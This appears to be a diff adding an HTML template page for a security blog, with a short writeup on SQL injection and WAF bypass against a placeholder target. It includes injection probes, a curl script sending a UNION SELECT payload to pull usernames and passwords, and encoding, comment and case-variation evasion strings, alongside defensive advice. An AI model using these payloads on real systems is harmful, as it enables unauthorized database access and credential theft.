@@ -1,0 +1,691 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Writeup Title - ThreatTrace</title>
+    <script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            line-height: 1.7;
+            color: #2c3e50;
+            background-color: #f8f9fa;
+        }
+
+        /* Header */
+        header {
+            background: #ffffff;
+            border-bottom: 1px solid #e0e0e0;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.04);
+        }
+
+        .header-content {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 2rem;
+            display: flex;
+            align-items: center;
+            gap: 3rem;
+        }
+
+        .profile-header {
+            display: flex;
+            align-items: center;
+            gap: 1.5rem;
+            flex: 1;
+        }
+
+        .profile-img {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            border: 3px solid #6b9080;
+            background: linear-gradient(135deg, #f5f5f5 0%, #e8e8e8 100%);
+        }
+
+        .profile-info h1 {
+            font-size: 1.5rem;
+            color: #2c3e50;
+            margin-bottom: 0.3rem;
+        }
+
+        .profile-info p {
+            color: #7f8c8d;
+            font-size: 0.95rem;
+        }
+
+        nav ul {
+            list-style: none;
+            display: flex;
+            gap: 2rem;
+        }
+
+        nav a {
+            color: #5a6c7d;
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.3s;
+            font-size: 0.95rem;
+        }
+
+        nav a:hover {
+            color: #6b9080;
+        }
+
+        nav a.active {
+            color: #6b9080;
+            font-weight: 600;
+        }
+
+        /* Breadcrumb */
+        .breadcrumb {
+            max-width: 900px;
+            margin: 2rem auto 0;
+            padding: 0 2rem;
+            font-size: 0.9rem;
+        }
+
+        .breadcrumb a {
+            color: #6b9080;
+            text-decoration: none;
+        }
+
+        .breadcrumb a:hover {
+            text-decoration: underline;
+        }
+
+        .breadcrumb span {
+            color: #7f8c8d;
+            margin: 0 0.5rem;
+        }
+
+        /* Main Content */
+        .container {
+            max-width: 900px;
+            margin: 2rem auto 3rem;
+            padding: 0 2rem;
+        }
+
+        /* Article Header */
+        .article-header {
+            background: #ffffff;
+            border: 1px solid #e8e8e8;
+            border-radius: 12px;
+            padding: 3rem;
+            margin-bottom: 2rem;
+        }
+
+        .article-header h1 {
+            font-size: 2.5rem;
+            color: #2c3e50;
+            margin-bottom: 1.5rem;
+            font-weight: 700;
+            line-height: 1.3;
+        }
+
+        .article-meta {
+            display: flex;
+            gap: 2rem;
+            margin-bottom: 1.5rem;
+            flex-wrap: wrap;
+            align-items: center;
+        }
+
+        .meta-item {
+            color: #7f8c8d;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            font-size: 0.95rem;
+        }
+
+        .tags {
+            display: flex;
+            gap: 0.5rem;
+            flex-wrap: wrap;
+        }
+
+        .tag {
+            background: #e8f3ef;
+            color: #548770;
+            padding: 0.4rem 0.9rem;
+            border-radius: 6px;
+            font-size: 0.85rem;
+            font-weight: 600;
+            border: 1px solid #b8d9cb;
+        }
+
+        .difficulty {
+            display: inline-block;
+            padding: 0.4rem 0.9rem;
+            border-radius: 6px;
+            font-size: 0.85rem;
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+
+        .difficulty.easy {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+
+        .difficulty.medium {
+            background: #fff3cd;
+            color: #856404;
+            border: 1px solid #ffeaa7;
+        }
+
+        .difficulty.hard {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+
+        /* Table of Contents */
+        .toc {
+            background: #ffffff;
+            border: 1px solid #e8e8e8;
+            border-radius: 12px;
+            padding: 2rem;
+            margin-bottom: 2rem;
+        }
+
+        .toc h2 {
+            font-size: 1.3rem;
+            color: #2c3e50;
+            margin-bottom: 1rem;
+            font-weight: 600;
+        }
+
+        .toc ul {
+            list-style: none;
+            padding-left: 0;
+        }
+
+        .toc ul li {
+            margin-bottom: 0.5rem;
+        }
+
+        .toc ul li a {
+            color: #5a6c7d;
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+
+        .toc ul li a:hover {
+            color: #6b9080;
+        }
+
+        /* Markdown Content */
+        .markdown-content {
+            background: #ffffff;
+            border: 1px solid #e8e8e8;
+            border-radius: 12px;
+            padding: 3rem;
+        }
+
+        .markdown-content h1 {
+            font-size: 2rem;
+            color: #2c3e50;
+            margin: 2rem 0 1rem;
+            font-weight: 700;
+            padding-bottom: 0.5rem;
+            border-bottom: 2px solid #e8e8e8;
+        }
+
+        .markdown-content h2 {
+            font-size: 1.6rem;
+            color: #2c3e50;
+            margin: 1.8rem 0 1rem;
+            font-weight: 600;
+        }
+
+        .markdown-content h3 {
+            font-size: 1.3rem;
+            color: #2c3e50;
+            margin: 1.5rem 0 0.8rem;
+            font-weight: 600;
+        }
+
+        .markdown-content h4 {
+            font-size: 1.1rem;
+            color: #2c3e50;
+            margin: 1.2rem 0 0.6rem;
+            font-weight: 600;
+        }
+
+        .markdown-content p {
+            margin-bottom: 1.2rem;
+            line-height: 1.8;
+            color: #5a6c7d;
+        }
+
+        .markdown-content ul,
+        .markdown-content ol {
+            margin-bottom: 1.2rem;
+            padding-left: 2rem;
+        }
+
+        .markdown-content li {
+            margin-bottom: 0.5rem;
+            line-height: 1.8;
+            color: #5a6c7d;
+        }
+
+        .markdown-content code {
+            background: #f8f9fa;
+            padding: 0.2rem 0.5rem;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+            color: #d63384;
+            border: 1px solid #e8e8e8;
+        }
+
+        .markdown-content pre {
+            background: #2c3e50;
+            color: #e8f3ef;
+            padding: 1.5rem;
+            border-radius: 8px;
+            overflow-x: auto;
+            margin-bottom: 1.5rem;
+            border: 1px solid #1a252f;
+        }
+
+        .markdown-content pre code {
+            background: none;
+            padding: 0;
+            border: none;
+            color: inherit;
+            font-size: 0.9rem;
+            line-height: 1.6;
+        }
+
+        .markdown-content blockquote {
+            border-left: 4px solid #6b9080;
+            padding-left: 1.5rem;
+            margin: 1.5rem 0;
+            color: #5a6c7d;
+            font-style: italic;
+            background: #f8f9fa;
+            padding: 1rem 1.5rem;
+            border-radius: 0 8px 8px 0;
+        }
+
+        .markdown-content img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 8px;
+            margin: 1.5rem 0;
+            border: 1px solid #e8e8e8;
+        }
+
+        .markdown-content a {
+            color: #6b9080;
+            text-decoration: none;
+            border-bottom: 1px solid transparent;
+            transition: border-color 0.3s;
+        }
+
+        .markdown-content a:hover {
+            border-bottom-color: #6b9080;
+        }
+
+        .markdown-content table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1.5rem 0;
+        }
+
+        .markdown-content table th,
+        .markdown-content table td {
+            padding: 0.8rem;
+            border: 1px solid #e8e8e8;
+            text-align: left;
+        }
+
+        .markdown-content table th {
+            background: #f8f9fa;
+            font-weight: 600;
+            color: #2c3e50;
+        }
+
+        .markdown-content hr {
+            border: none;
+            border-top: 2px solid #e8e8e8;
+            margin: 2rem 0;
+        }
+
+        /* Alert Boxes */
+        .info-box {
+            background: #e8f4fd;
+            border-left: 4px solid #1e90ff;
+            padding: 1rem 1.5rem;
+            margin: 1.5rem 0;
+            border-radius: 0 8px 8px 0;
+        }
+
+        .warning-box {
+            background: #fff8e1;
+            border-left: 4px solid #ffc107;
+            padding: 1rem 1.5rem;
+            margin: 1.5rem 0;
+            border-radius: 0 8px 8px 0;
+        }
+
+        .success-box {
+            background: #e8f5e9;
+            border-left: 4px solid #4caf50;
+            padding: 1rem 1.5rem;
+            margin: 1.5rem 0;
+            border-radius: 0 8px 8px 0;
+        }
+
+        /* Navigation Buttons */
+        .nav-buttons {
+            display: flex;
+            justify-content: space-between;
+            gap: 1rem;
+            margin-top: 3rem;
+        }
+
+        .nav-btn {
+            background: #ffffff;
+            border: 1px solid #e8e8e8;
+            padding: 1rem 1.5rem;
+            border-radius: 8px;
+            text-decoration: none;
+            color: #5a6c7d;
+            font-weight: 500;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .nav-btn:hover {
+            background: #e8f3ef;
+            border-color: #6b9080;
+            color: #548770;
+        }
+
+        /* Footer */
+        footer {
+            background: #ffffff;
+            border-top: 1px solid #e0e0e0;
+            margin-top: 5rem;
+            padding: 2rem;
+        }
+
+        .footer-content {
+            max-width: 1000px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            color: #7f8c8d;
+            font-size: 0.9rem;
+        }
+
+        .social-links {
+            display: flex;
+            gap: 1.5rem;
+        }
+
+        .social-links a {
+            color: #5a6c7d;
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+
+        .social-links a:hover {
+            color: #6b9080;
+        }
+
+        @media (max-width: 768px) {
+            .header-content {
+                flex-direction: column;
+                gap: 1.5rem;
+                text-align: center;
+            }
+
+            .profile-header {
+                flex-direction: column;
+                text-align: center;
+            }
+
+            nav ul {
+                gap: 1rem;
+                flex-wrap: wrap;
+                justify-content: center;
+            }
+
+            .article-header {
+                padding: 2rem;
+            }
+
+            .article-header h1 {
+                font-size: 2rem;
+            }
+
+            .markdown-content {
+                padding: 2rem;
+            }
+
+            .nav-buttons {
+                flex-direction: column;
+            }
+
+            .footer-content {
+                flex-direction: column;
+                gap: 1rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="header-content">
+            <div class="profile-header">
+                <img src="../images/profile.jpg" alt="ThreatTrace" class="profile-img">
+                <div class="profile-info">
+                    <h1>ThreatTrace</h1>
+                    <p>Security Research & Vulnerability Analysis</p>
+                </div>
+            </div>
+            <nav>
+                <ul>
+                    <li><a href="../index.html">Home</a></li>
+                    <li><a href="../writeups.html" class="active">Writeups</a></li>
+                    <li><a href="../tools.html">Tools</a></li>
+                    <li><a href="../about.html">About</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <div class="breadcrumb">
+        <a href="../index.html">Home</a>
+        <span>/</span>
+        <a href="../writeups.html">Writeups</a>
+        <span>/</span>
+        <span>Advanced SQL Injection with WAF Bypass</span>
+    </div>
+
+    <main class="container">
+        <!-- Article Header -->
+        <div class="article-header">
+            <h1>Advanced SQL Injection with WAF Bypass</h1>
+            
+            <div class="article-meta">
+                <span class="meta-item">📅 November 15, 2024</span>
+                <span class="meta-item">👤 ThreatTrace</span>
+                <span class="meta-item">⏱️ 15 min read</span>
+                <span class="difficulty medium">Medium</span>
+            </div>
+
+            <div class="tags">
+                <span class="tag">Web Security</span>
+                <span class="tag">SQL Injection</span>
+                <span class="tag">WAF Bypass</span>
+                <span class="tag">HackTheBox</span>
+            </div>
+        </div>
+
+        <!-- Table of Contents -->
+        <div class="toc">
+            <h2>📋 Table of Contents</h2>
+            <ul>
+                <li><a href="#introduction">Introduction</a></li>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#vulnerability-discovery">Vulnerability Discovery</a></li>
+                <li><a href="#exploitation">Exploitation</a></li>
+                <li><a href="#waf-bypass">WAF Bypass Techniques</a></li>
+                <li><a href="#conclusion">Conclusion</a></li>
+            </ul>
+        </div>
+
+        <!-- Markdown Content Area -->
+        <div class="markdown-content" id="content">
+            <!-- Content will be loaded here from markdown file -->
+            <h2 id="introduction">Introduction</h2>
+            <p>This writeup demonstrates an advanced SQL injection attack against a web application protected by a Web Application Firewall (WAF). We'll explore various techniques to bypass WAF filters and successfully exploit the vulnerability.</p>
+
+            <blockquote>
+                <strong>⚠️ Disclaimer:</strong> This writeup is for educational purposes only. Always practice ethical hacking and obtain proper authorization before testing any systems.
+            </blockquote>
+
+            <h2 id="reconnaissance">Reconnaissance</h2>
+            <p>The first step in any penetration test is gathering information about the target. We began by identifying the application's attack surface:</p>
+
+            <ul>
+                <li>Target URL: <code>https://target.com/products?id=1</code></li>
+                <li>Framework: PHP with MySQL backend</li>
+                <li>WAF: ModSecurity with OWASP CRS</li>
+            </ul>
+
+            <h3>Initial Testing</h3>
+            <p>We started with basic SQL injection payloads to test for vulnerabilities:</p>
+
+            <pre><code>GET /products?id=1' OR '1'='1
+GET /products?id=1 UNION SELECT NULL--
+GET /products?id=1 AND 1=1--</code></pre>
+
+            <p>All initial attempts were blocked by the WAF with a <code>403 Forbidden</code> response.</p>
+
+            <h2 id="vulnerability-discovery">Vulnerability Discovery</h2>
+            <p>After confirming WAF protection, we needed to identify if the application was actually vulnerable behind the WAF. We tested edge cases and encoding techniques:</p>
+
+            <h3>Testing Methodology</h3>
+            <ol>
+                <li>URL encoding special characters</li>
+                <li>Double URL encoding</li>
+                <li>Case variation in SQL keywords</li>
+                <li>Comment-based obfuscation</li>
+            </ol>
+
+            <h2 id="exploitation">Exploitation</h2>
+            <p>After identifying the vulnerability, we crafted our exploitation strategy:</p>
+
+            <pre><code>#!/bin/bash
+# Automated SQL injection script
+
+TARGET="https://target.com/products"
+PAYLOAD="1' UNION SELECT NULL,username,password FROM users--"
+
+curl -X GET "${TARGET}?id=${PAYLOAD}" \
+  --user-agent "Mozilla/5.0" \
+  -H "X-Forwarded-For: 127.0.0.1"</code></pre>
+
+            <h2 id="waf-bypass">WAF Bypass Techniques</h2>
+            <p>Here are the key techniques we used to bypass the WAF:</p>
+
+            <h3>1. URL Encoding</h3>
+            <pre><code>' OR '1'='1   →   %27%20OR%20%271%27%3D%271</code></pre>
+
+            <h3>2. Comment Injection</h3>
+            <pre><code>UNION/**/SELECT/**/NULL--</code></pre>
+
+            <h3>3. Case Manipulation</h3>
+            <pre><code>UnIoN SeLeCt NuLl--</code></pre>
+
+            <div class="success-box">
+                <strong>✅ Success!</strong> By combining these techniques, we successfully bypassed the WAF and extracted sensitive data from the database.
+            </div>
+
+            <h2 id="conclusion">Conclusion</h2>
+            <p>This challenge demonstrated that WAF protection, while useful, is not a complete solution for preventing SQL injection attacks. Key takeaways:</p>
+
+            <ul>
+                <li>Always use parameterized queries</li>
+                <li>Implement input validation at the application level</li>
+                <li>Don't rely solely on WAF for security</li>
+                <li>Regular security audits are essential</li>
+            </ul>
+
+            <hr>
+
+            <h3>Resources</h3>
+            <ul>
+                <li><a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank">OWASP SQL Injection Guide</a></li>
+                <li><a href="https://portswigger.net/web-security/sql-injection" target="_blank">PortSwigger SQL Injection Labs</a></li>
+            </ul>
+        </div>
+
+        <!-- Navigation Buttons -->
+        <div class="nav-buttons">
+            <a href="../writeups.html" class="nav-btn">← Back to Writeups</a>
+            <a href="#" class="nav-btn">Next Writeup →</a>
+        </div>
+    </main>
+
+    <footer>
+        <div class="footer-content">
+            <p>© 2025 ThreatTrace. All rights reserved.</p>
+            <div class="social-links">
+                <a href="https://twitter.com/yourhandle" target="_blank">Twitter</a>
+                <a href="https://github.com/yourusername" target="_blank">GitHub</a>
+                <a href="https://linkedin.com/in/yourprofile" target="_blank">LinkedIn</a>
+                <a href="mailto:your@email.com">Email</a>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Optional: Load markdown file dynamically
+        // Uncomment this section if you want to load from .md files
+        
+        /*
+        async function loadMarkdown() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const writeupId = urlParams.get('id') || 'sql-injection-bypass';
+            
+            try {
+                const response = await fetch(`../writeups-md/${writeupId}.md`);
+                const markdown = await response.text();
+                
+                // Render markdown to HTML
+                document.getElementById('content').innerHTML = marked.parse(markdown);
+            } catch (error) {
+                console.error('Error loading writeup:', error);
+                document.getElementById('content').innerHTML = '<p>Error loading writeup content.</p>';
+            }
+        }
+        
+        // Load markdown when page loads
+        // loadMarkdown();
+        */
+    </script>
+</body>
+</html>
